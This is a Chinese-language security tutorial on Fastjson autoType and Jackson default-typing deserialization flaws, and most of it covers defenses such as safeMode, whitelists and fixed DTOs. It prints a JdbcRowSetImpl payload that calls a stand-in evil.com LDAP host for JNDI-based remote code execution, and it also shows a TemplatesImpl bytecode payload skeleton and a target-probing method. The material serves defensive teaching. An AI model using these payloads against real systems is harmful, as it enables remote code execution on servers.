---
title: Fastjson / Jackson：JSON 解析库里的"按类实例化"陷阱
description: 拆解 Fastjson autoType 与 Jackson 多态类型为何会重蹈反序列化覆辙——库按攻击者指定的类去实例化对象，结合 JNDI/TemplatesImpl 直达 RCE，并给出 safeMode、白名单等关闭方案。
category: security
subcategory: java-eco
tags: ['Fastjson', 'Jackson', 'autoType', 'JSON反序列化', 'RCE']
pubDate: 2026-07-19
updatedDate: 2026-07-19
order: 4
---

上一篇讲了 Java 原生反序列化怎么被 gadget 链打穿。你可能会想："那我不序列化 Java 对象了，改用 JSON 总安全了吧？"——不一定。如果 JSON 库支持**"按类名还原对象"**，那它本质上还是在做反序列化，只是换了个皮。

这一篇看两个主角：`Fastjson`（国产高频库）和 `Jackson`（Spring 默认）。它们的"类型推断"功能，曾让无数应用从"解析一段 JSON"变成"执行一段命令"。

> 本文仅用于授权靶场与防御研究。对他人系统利用下述漏洞属违法。

## JSON 库为什么要"知道类型"

JSON 本身是无类型的：`{"name":"a"}` 反序列化时，库得猜它该变成 `User` 还是 `Map`。当业务需要多态（比如一个字段可能是 `Cat` 也可能是 `Dog`，都实现 `Animal`），库就提供了"在 JSON 里标类名"的能力：

- Fastjson：`@type` 字段指定类，例如 `{"@type":"com.x.Dog","name":"a"}`。
- Jackson：`@JsonTypeInfo` + `enableDefaultTyping()` / `activateDefaultTyping`，在 JSON 里塞 `@class`。

**危险就在这个"指定类"**：如果库会按 JSON 里的类名去 `Class.forName` 并实例化，攻击者就能指定任意危险类，把反序列化链整个搬过来。

## Fastjson 的 autoType：从方便到灾难

Fastjson 早期默认开启 `autoType`：反序列化时看到 `@type`，就加载并实例化对应类。攻击者在 JSON 里写：

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://evil.com:1389/Exploit",
  "autoCommit": true
}
```

`JdbcRowSetImpl` 在设置 `dataSourceName` + `autoCommit=true` 时会**发起 JNDI 查询**——这和 Log4Shell 的利用链完全接上了：`@type` 让库实例化了 `JdbcRowSetImpl`，库帮你触发了 JNDI，于是 RCE。

另一类打法是直接加载字节码：

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["...恶意 class 的 base64...],
  "_name": "x",
  "_tfactory": {},
  "_outputProperties": {}
}
```

`TemplatesImpl` 在 `getOutputProperties()` 时会**把 `_bytecodes` 定义的类加载并执行**——攻击者把恶意类的字节码 base64 塞进去，Fastjson 一实例化就中招。

## 黑名单与绕过：一场猫鼠游戏

Fastjson 在 1.2.25 起默认关闭 `autoType`，并引入**黑名单**（denylist）拦截已知危险类。但黑名单永远慢一步：

- 攻击者找黑名单没覆盖的"新危险类"或"间接危险类"（通过 setter 链式触发）。
- 各种 `autoType` bypass 技巧层出不穷（利用检查顺序、利用非标准写法）。

于是 Fastjson 的版本史几乎就是一部"补洞—被绕—再补"的历史。对使用者来说，靠"升级到某个版本"并不够稳。

## Jackson 的多态类型：同一类坑

Jackson 默认**不**带类型信息，相对安全。但很多项目为了多态会开：

```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();   // 危险！等价于允许 @class 指定类型
// 或注解 @JsonTypeInfo(use = Id.CLASS)
```

开启后，JSON 里的 `@class` 会被用来实例化对应类，同样可能触发 `JdbcRowSetImpl`、`TemplatesImpl` 等链（CVE-2017-7525 等）。Jackson 后来把 `enableDefaultTyping` 标记为不安全，推荐 `activateDefaultTyping` 并配合**白名单**（PolymorphicTypeValidator）。

## 防御：关掉"按类实例化"

**Fastjson：直接进 safeMode（最彻底）**

```java
// 1.2.68+ 支持 safeMode，完全禁止 autoType，且不依赖黑名单
ParserConfig.getGlobalInstance().setSafeMode(true);
// 之后任何 @type 都会直接报错，从源头掐断
```

老版本无法 safeMode 的，至少升级到官方修复版并显式关闭：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
```

**Jackson：用白名单替代默认类型**

```java
ObjectMapper mapper = new ObjectMapper();
// 只允许可信包下的多态类型
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,   // 实际应换成自定义白名单
    ObjectMapper.DefaultTyping.NON_FINAL
);
// 更安全：干脆不用默认类型，改用显式 @JsonTypeInfo 且只接受已知子类
```

**通用原则：**

- 能不用"按类名还原"就别用；多态场景用**显式注册子类**而非开放 `@type`/`@class`。
- 反序列化来自用户的 JSON 时，目标类型固定为**你自己的 DTO**，不让用户决定类。
- 配合 WAF 拦截含 `@type`、`JdbcRowSetImpl`、`TemplatesImpl` 的 JSON 体。

## Fastjson 的 bypass 简史

理解这段历史，能帮你明白"为什么光升级不够"：

- **1.2.24 及之前**：`autoType` 默认开，几乎无防护，直接用 `JdbcRowSetImpl` 打。
- **1.2.25**：引入 `autoType` 开关 + **黑名单**，默认关 `autoType`，封了一批类名。
- **此后数年**：白帽不断找到黑名单外的"新危险类"或"间接触发类"，Fastjson 不断加黑名单、出小版本——这是一场永远慢半拍的猫鼠游戏。
- **1.2.68**：引入 `safeMode`，**彻底禁止 `autoType`**，不再依赖黑名单，才算真正根治。

结论很明确：对 Fastjson，**要么上 `safeMode`，要么直接换 Jackson**，靠"追着版本号升级"并不稳。

## Fastjson 与 Jackson 怎么选

- **新项目**：优先 Jackson（Spring 默认、社区活跃、默认安全）。只在确实需要 `@type` 多态时才显式开，并配白名单。
- **老项目用 Fastjson**：立即 `setSafeMode(true)`；若版本不支持 safeMode，至少升级到官方修复版并显式关 `autoType`，同时 WAF 拦截 `@type`/`JdbcRowSetImpl`/`TemplatesImpl`。
- **统一原则**：反序列化来自用户的 JSON 时，**目标类型固定为你自己的 DTO**，绝不让用户通过 `@type`/`@class` 决定实例化哪个类。

## 审计要点：在代码里找风险

- 搜 `JSON.parseObject(` / `JSON.parse(`：看第二个参数有没有传 `Feature.SupportNonPublicField`、`AutoType` 相关，或全局 `autoTypeSupport=true`。
- 搜 `ObjectMapper`：看是否 `enableDefaultTyping` / `activateDefaultTyping` 且没配白名单 `PolymorphicTypeValidator`。
- 看 DTO 上是否有 `@JsonTypeInfo(use = Id.CLASS)` 且类型开放。

## 流量特征：怎么判断目标用 Fastjson 还是 Jackson

实战（授权渗透/红队）里常需要先识别目标用哪个库，再选对应利用方式。两个常见判断法：

- **Fastjson 的报错特征**：给一个不合法的 `@type`（如 `{"@type":"java.lang.Object"` 配畸形结构），Fastjson 常返回独特的 `com.alibaba.fastjson.JSONException` 异常栈；Jackson 则会报 `InvalidTypeIdException` 或 `MismatchedInputException`，错误信息风格不同。
- **Fastjson 的 `autoType` 探测**：发 `{"@type":"com.sun.rowset.JdbcRowSetImpl",...}` 这种 payload，若目标真用 Fastjson 且开着 autoType，行为（出网 JNDI/DNS）会暴露；Jackson 默认不认 `@type`，无此行为。

注意：这是**识别手段**，不是攻击步骤。识别清楚才能对症下药——该关 Fastjson 的 safeMode，还是该给 Jackson 配白名单。

## 安全示例：固定 DTO 的正确写法

反序列化用户 JSON 时，最稳的写法是**目标类型写死成你自己的 DTO**，不让用户决定类：

```java
// 安全：明确告诉库"反序列化成 UserDTO"，用户无法指定别的类
UserDTO user = JSON.parseObject(jsonFromUser, UserDTO.class);

// Fastjson 开启 safeMode（全局，最彻底）
ParserConfig.getGlobalInstance().setSafeMode(true);

// Jackson 显式指定目标类，且不开默认类型
ObjectMapper mapper = new ObjectMapper();
UserDTO user2 = mapper.readValue(jsonFromUser, UserDTO.class);
```

要点：DTO 里只放业务字段，不放任何能"触发危险逻辑"的属性；需要多态时，用 `@JsonSubTypes` 显式枚举允许的子类，而不是开放 `@class` 让用户输入任意类名。

## 一个常见误用：用 JSON 传"任意对象"

即使你没用 Fastjson/Jackson 的类型推断，自己写的代码也可能重蹈覆辙。典型反模式：API 接收一个 `{ "type": "xxx", "data": {...} }`，然后**用 `type` 字段去 `Class.forName` 实例化对应类**——这等于你自己实现了一个 `autoType`：

```java
// 危险：用户决定实例化哪个类
String type = json.getString("type");          // 来自请求
Class<?> clazz = Class.forName("com.app." + type);
Object obj = mapper.readValue(json.getString("data"), clazz);
// 攻击者在 type 里填危险类名 → 同样触发 gadget
```

更隐蔽的：把 JSON 读成 `Map<String,Object>` 或 `JsonNode`，再对里面的对象做 `instanceof` + 强制转型去调方法，若转型目标可被用户间接控制，风险同源。

**安全写法**：用**封闭枚举**列出允许的类型，绝不让用户字符串直接进 `Class.forName`：

```java
enum PayloadType { DOG, CAT }   // 只有这两个，用户无法指定别的类
PayloadType t = PayloadType.valueOf(json.getString("type"));  // 非法值直接抛异常
```

根本原则一句话：**用户的输入只能当"数据值"，绝不能当"类型/类名/指令"**。

## 快速识别：你的项目有没有踩 JSON 反序列化坑

给一个 30 秒自检清单，照着答"是/否"：

1. 项目里搜 `parseObject` / `JSON.parse(`，第二个参数出现过 `Feature.SupportAutoType`、`AutoType` 或全局 `autoTypeSupport=true` 吗？→ 有则高危。
2. `ObjectMapper` 上有 `enableDefaultTyping` / `activateDefaultTyping` 且没配 `PolymorphicTypeValidator` 白名单吗？→ 有则高危。
3. 有没有接口把 JSON 的 `type`/`@type` 字段直接 `Class.forName` 实例化？→ 有则高危（见上节）。
4. DTO 里有没有字段类型是 `Object`/`Map`/`JsonNode` 且后续被强制转型调用方法？→ 需重点审。
5. 依赖树里 `fastjson` 版本是否在 `1.2.68` 之前且未开 `safeMode`？→ 是则高危。

任意一项答"是"，都建议按前面"防御"一节改掉。养成"引入 JSON 库先看类型推断开关"的习惯，能挡掉一大半这类风险。

## 为什么历史版本默认开 autoType

理解"为什么当初会这么设计"，能帮你避免矫枉过正。Fastjson 早期把 `autoType` 默认开启，是为了**开发方便**：前端传 `{ "@type":"com.app.User", ... }`，后端就能直接还原成对应的具体类，省去手动写类型映射。这是典型的"便利性优先于安全性"的取舍——在受信任的内部系统里问题不大，但一旦接口暴露给不可信用户，便利就变成了 RCE 通道。后来的 `safeMode` 其实是用"显式声明允许的类型"替代"默认全开"，既保留多态能力，又堵死任意类实例化。这给我们的启示是：**任何"按数据决定类型/行为"的设计，都要先问一句"数据来自谁"**。

## 常见误区

- **"Fastjson 升级到最新就安全"**：若仍开着 `autoType` 且没 safeMode，新 bypass 出现时你还是裸奔。
- **"Jackson 默认就安全，随便开"**：`enableDefaultTyping` 一开，风险等级瞬间和 Fastjson 早期一样。
- **"JSON 比原生反序列化安全"**：安全与否取决于"是否按类名实例化"，而不是格式本身。

## 自测题

1. 在你项目里搜 `parseObject`，确认全局 `autoType` 是开是关，有没有 `safeMode`？
2. 为什么 Fastjson 的黑名单机制长期被 bypass，而 safeMode 能根治？
3. Jackson 的 `activateDefaultTyping` 配了白名单（PolymorphicTypeValidator）后，和不开有什么区别？
4. 给"反序列化用户 JSON"写一个安全的目标类型写法（固定 DTO，不暴露 `@type`）。

## 这一篇你该记住的

- JSON 库一旦支持"按类名实例化"（`@type` / `@class`），就退化成了反序列化器，gadget 链照样能用。
- Fastjson `autoType` + `JdbcRowSetImpl` 直接接 Log4Shell 的 JNDI 链；`TemplatesImpl` 可加载攻击者字节码。
- Fastjson 黑名单长期被 bypass，靠"升级版本"不够稳。
- Jackson 默认安全，但 `enableDefaultTyping` 会打开同类风险，对应 CVE-2017-7525 等。
- 根治：Fastjson 开 `safeMode`；Jackson 用白名单 PolymorphicTypeValidator；目标类型固定为你自己的 DTO。

下一篇我们把视线移到**入口层框架**——`Struts2`。它的 OGNL 表达式引擎，让"请求参数里写表达式"就能命令执行，是 Java 生态里漏洞数量最多的框架之一。